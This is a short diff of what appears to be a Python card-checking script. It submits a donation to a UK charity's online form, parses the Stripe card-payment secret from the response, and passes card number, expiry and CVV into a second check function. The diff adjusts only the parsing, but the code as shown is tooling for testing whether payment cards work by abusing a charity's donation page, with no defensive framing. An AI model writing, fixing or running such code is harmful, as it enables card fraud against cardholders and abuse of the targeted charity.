@@ -42,12 +42,12 @@ def chk_one(r,rand_user):
     # }
 
     c = r.post('https://www.heartuk.org.uk/donate/single-donation/submit', b_data)
-    confirmCardPayment = find_between(c.text, 'stripe.handleCardPayment("','"')
+    confirmCardPayment = find_between(c.text, 'stripe.handleCardPayment(','",')
     if not confirmCardPayment: return
-    return confirmCardPayment
+    return confirmCardPayment.replace('"','')
 
 
-
+ 
 def chk_two(r, sec, cc, mes,ano, cvv, rand_user):
     req_sec = sec.split('_secret')[0]
     payload_e = {
